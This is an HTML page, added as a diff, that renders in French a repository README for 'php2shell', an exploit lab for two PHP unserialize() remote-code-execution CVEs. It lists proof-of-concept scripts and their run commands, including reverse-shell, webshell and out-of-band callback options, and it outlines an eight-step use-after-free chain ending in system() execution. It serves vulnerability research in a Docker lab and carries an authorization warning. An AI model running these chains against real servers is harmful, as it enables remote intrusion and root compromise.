@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ultradefense-lab/php2shell · GitHub</title>
+<style>
+:root{--bd:#d1d9e0;--fg:#1f2328;--mut:#59636e;--bg:#fff;--ac:#0969da;--green:#1a7f37;
+--code-bg:#f6f8fa;--header:#24292f;--tabhover:#f6f8fa}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 -apple-system,"Segoe UI",Helvetica,Arial,sans-serif}
+.topbar{background:var(--header);color:#fff;padding:10px 24px;font-size:13px;display:flex;align-items:center;gap:10px}
+.octocat{width:22px;height:22px;background:#fff;-webkit-mask:radial-gradient(circle at 33% 33%,var(--header) 4px,transparent 4.5px);border-radius:50%;position:relative}
+.githubword{font-weight:600;letter-spacing:.3px}
+.wrap{max-width:1012px;margin:0 auto;padding:0 16px 80px}
+.reponav{display:flex;gap:8px;align-items:center;padding:20px 0 0;font-size:18px}
+.reponav .crumb{color:var(--ac);font-weight:400}
+.reponav .slash{color:var(--mut);padding:0 2px}
+.reponav .name{font-weight:400}
+.pub{border:1px solid var(--bd);border-radius:2em;font-size:11.5px;color:var(--mut);padding:0 8px;margin-left:8px;vertical-align:2px}
+.tabs{display:flex;gap:4px;border-bottom:1px solid var(--bd);margin-top:16px;font-size:14px;padding:0 8px}
+.tab{padding:8px 14px;color:var(--fg);display:flex;gap:6px;align-items:center;cursor:default}
+.tab.active{font-weight:600;border-bottom:2px solid #fd8c73;margin-bottom:-1px}
+.tab .ico{opacity:.75}
+.filebox{border:1px solid var(--bd);border-radius:6px;margin-top:24px;overflow:hidden}
+.filerow{display:flex;align-items:center;padding:7px 16px;font-size:14px;border-bottom:1px solid #eaeef2}
+.filerow:last-child{border-bottom:none}
+.filerow:hover{background:var(--tabhover)}
+.fname{color:var(--ac);margin-left:8px}
+.dir .fname{font-weight:600}
+.fmsg{color:var(--mut);font-size:13px;margin-left:auto;padding-right:16px;text-align:right;max-width:45%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dirico{color:var(--ac);font-weight:700}
+.fileico{color:var(--mut)}
+.readme{border:1px solid var(--bd);border-radius:6px;margin-top:24px;padding:32px}
+.readme h1{font-size:24px;margin:0 0 12px;padding-bottom:10px;border-bottom:1px solid var(--bd)}
+.readme h2{font-size:19px;margin:28px 0 10px;padding-bottom:7px;border-bottom:1px solid var(--bd)}
+.readme p{margin:12px 0}
+.readme ul{padding-left:24px;margin:10px 0}
+.readme li{margin:4px 0}
+.readme code{background:rgba(175,184,193,.25);border-radius:6px;padding:2px 6px;font:85% ui-monospace,Menlo,monospace}
+.readme pre{background:var(--code-bg);border:1px solid var(--bd);border-radius:6px;padding:14px;overflow-x:auto;font:13px/1.5 ui-monospace,Menlo,monospace}
+.readme pre code{background:none;padding:0;font-size:13px}
+.readme table{border-collapse:collapse;margin:14px 0;width:100%}
+.readme th,.readme td{border:1px solid var(--bd);padding:6px 12px;font-size:13.5px}
+.readme th{background:var(--code-bg)}
+.badges{display:flex;gap:6px;flex-wrap:wrap;margin:8px 0 4px}
+.badge{display:inline-flex;border-radius:3px;font:11.5px Verdana,sans-serif;overflow:hidden}
+.badge b{background:#555;color:#fff;padding:3px 6px;font-weight:600}
+.badge i{font-style:normal;color:#fff;padding:3px 7px}
+.red b{background:#8b1a1a}.red i{background:#f85149}
+.blue b{background:#0a3d62}.blue i{background:#0969da}
+.green b{background:#113d20}.green i{background:#1a7f37}
+.yellow b{background:#6b5300}.yellow i{background:#d29922}
+.marker{border:1px solid var(--bd);border-left:4px solid var(--green);background:#f6f8fa;border-radius:6px;padding:10px 16px;margin:16px 0;font-weight:600}
+.warn{border:1px solid #d29922;border-left:4px solid #d29922;background:#fff8c5;border-radius:6px;padding:12px 16px;margin:16px 0}
+.ascii{color:#1f2328;text-align:left;display:inline-block}
+footer{color:var(--mut);text-align:center;font-size:12px;padding:26px 0;border-top:1px solid var(--bd);margin-top:40px}
+a{color:var(--ac);text-decoration:none}
+</style>
+</head>
+<body>
+<div class="topbar"><span class="githubword">GitHub</span><span style="opacity:.6">— rendu hors ligne du dépôt</span></div>
+<div class="wrap">
+
+<div class="reponav">
+ <span class="crumb">ultradefense-lab</span><span class="slash">/</span><span class="name crumb"><b>php2shell</b></span>
+ <span class="pub">Public</span>
+</div>
+
+<div class="tabs">
+ <span class="tab active"><span class="ico">&#128193;</span> Code</span>
+ <span class="tab"><span class="ico">&#9883;</span> Security <span style="background:#f85149;color:#fff;border-radius:8px;font-size:10px;padding:1px 6px">2</span></span>
+ <span class="tab"><span class="ico">&#9881;</span> Settings</span>
+</div>
+
+<div class="filebox">
+ <div class="filerow dir"><span class="dirico">&#128193;</span><span class="fname">LAB/</span><span class="fmsg">cible Docker vulnérable, config bridge (8486 http / 8483 https)</span></div>
+ <div class="filerow dir"><span class="dirico">&#128193;</span><span class="fname">POC/</span><span class="fmsg">exploits Python + PHP, pocket PoC à bannière ASCII</span></div>
+ <div class="filerow"><span class="fileico">&#128196;</span><span class="fname">README.md</span><span class="fmsg">Karim BOUDRA @ ULTRADEFENSE LAB — 21 octobre 2026</span></div>
+ <div class="filerow"><span class="fileico">&#128196;</span><span class="fname">index.html</span><span class="fmsg">cette page</span></div>
+</div>
+
+<div class="readme" id="readme">
+<h1>PHP2SHELL — CVE-2026-109618 / CVE-2026-109619</h1>
+
+<div class="badges">
+ <span class="badge red"><b>CVE-2026-109618</b><i>RCE</i></span>
+ <span class="badge red"><b>CVE-2026-109619</b><i>RCE</i></span>
+ <span class="badge blue"><b>PHP</b><i>8.5.11 vulnérable</i></span>
+ <span class="badge green"><b>chaînes</b><i>4/4 confirmées</i></span>
+ <span class="badge yellow"><b>portée</b><i>lab uniquement</i></span>
+</div>
+
+<div class="marker">Karim BOUDRA @ ULTRADEFENSE LAB · 21 octobre 2026</div>
+
+<p>Deux RCE dans le coeur de <code>unserialize()</code> de PHP (branches <code>C:</code> Serializable et
+<code>E:</code> enum-autoload du <code>var_unserializer.re</code>), reproduites le jour même du patch :
+root en local avec <code>disable_functions</code> contourné, shell <code>www-data</code> à distance en
+~2 200 requêtes, en HTTP comme en TLS, pour les deux CVE.</p>
+
+<pre class="ascii">
+███  █  █ ███  ████  ███ █  █ ████ █    █      ███  ███  ███  █  █ ████ ████
+█  █ █  █ █  █    █ █    █  █ █    █    █      █  █ █  █ █    █ █  █      █
+███  ████ ███    █   ██  ████ ███  █    █      ███  █  █ █    ██   ███    █
+█    █  █ █     █      █ █  █ █    █    █      █    █  █ █    █ █  █      █
+█    █  █ █    ████ ███  █  █ ████ ████ ████   █    ███  ███  █  █ ████   █
+              Karim BOUDRA @ ULTRADEFENSE LAB
+</pre>
+
+<h2>Structure</h2>
+<pre><code>LAB/                     cible vulnérable en Docker, config bridge
+  Dockerfile             php:8.5.11-apache épinglé, deux portes + TLS + checker
+  docker-compose.yml     network_mode: bridge, ports 8486 (http) / 8483 (https)
+  run.sh                 up | status | down | clean
+POC/
+  php8_remote.py         exploit distant branche C:  (--url https://... --insecure)
+  php8_remote_enum.py    exploit distant branche E:
+  local_exploit.php      exploit local branche C:   (root + bypass disable_functions)
+  enum_exploit.php       exploit local branche E:
+  pocket_poc.php         PoC de poche : bannière ASCII, sondes 2 CVE, démo UAF</code></pre>
+
+<h2>Démarrage</h2>
+<pre><code>cd LAB
+./run.sh up     # build + conteneur bridge, écoute sur toutes les interfaces
+                # local : http://127.0.0.1:8486   lan : http://IP_WIFI:8486</code></pre>
+
+<h2>Exploitation</h2>
+<pre><code># détection de poche (n'importe quel serveur PHP)
+php POC/pocket_poc.php --demo
+
+# chaîne distante complète (~2 200 requêtes, oracle de crash prefork)
+python3 POC/php8_remote.py      --url http://127.0.0.1:8486/remote_app.php
+python3 POC/php8_remote_enum.py --url https://127.0.0.1:8483/enum.php --insecure
+
+# preuves : marqueur local, callback OAST, reverse shell, webshell
+python3 POC/php8_remote.py --url http://127.0.0.1:8486/remote_app.php --oast xxxx.oastify.com
+python3 POC/php8_remote.py --url http://127.0.0.1:8486/remote_app.php --reverse IP:4444
+python3 POC/php8_remote.py --url http://127.0.0.1:8486/remote_app.php --webshell c.php</code></pre>
+
+<h2>Résultats vérifiés (php:8.5.11)</h2>
+<table>
+<tr><th>Chaîne</th><th>Requêtes</th><th>Résultat</th></tr>
+<tr><td>C: HTTP</td><td>2 169</td><td>www-data RCE</td></tr>
+<tr><td>C: HTTPS</td><td>2 169</td><td>www-data RCE</td></tr>
+<tr><td>E: HTTP</td><td>2 281</td><td>www-data RCE</td></tr>
+<tr><td>E: HTTPS</td><td>2 175</td><td>www-data RCE</td></tr>
+<tr><td>C: / E: local</td><td>-</td><td>root, disable_functions contourné</td></tr>
+</table>
+
+<h2>La chaîne en huit étapes</h2>
+<ol>
+<li>gadget <code>unserialize($data)-&gt;x = 0;</code> (porte C:) ou autoload d'enum (porte E:)</li>
+<li>payload <code>a:41:{...}</code> : porte + stdClass 8 props + 32 sprays + <code>R:4..11</code></li>
+<li>resize 8 vers 16 : <code>efree()</code> de l'arData, slots 4..11 pointent dedans (UAF)</li>
+<li>reclaim : les sprays de 280 octets réoccupent le bin-320 libéré</li>
+<li>leak heap : write-through <code>R:N</code> d'un pointeur <code>zend_reference</code></li>
+<li><code>uaf_read(addr, n)</code> : fausse <code>IS_STRING</code> positionnée n'importe où</li>
+<li>closure factice : <code>ce</code>, <code>handlers</code>, <code>func.handler = zif_system</code></li>
+<li>dispatch : <code>$result[33]("id")</code> en local, vtable factice <code>system()</code> à distance</li>
+</ol>
+
+<div class="warn"><b>Avertissement.</b> Le bug n'est exploitable que si l'application cible
+passe des données attaquables à <code>unserialize()</code>. Contre un tiers : autorisation
+écrite + crash-DoS ROE. Ce dépôt est un lab : ne l'exposez que sur des réseaux
+contrôlés, refermez-le avec <code>./run.sh down</code> après usage.</div>
+
+<p>Crédits recherche : Calif (MAD Bugs, PoC C: public), Nicolas Grekas (GH-23981,
+branche E:). Variantes E:, empaquetage et page : Karim BOUDRA @ ULTRADEFENSE LAB.</p>
+</div>
+
+<footer>ULTRADEFENSE LAB · dépôt statique hors ligne · aucune donnée n'est chargée depuis l'extérieur</footer>
+</div>
+</body>
+</html>
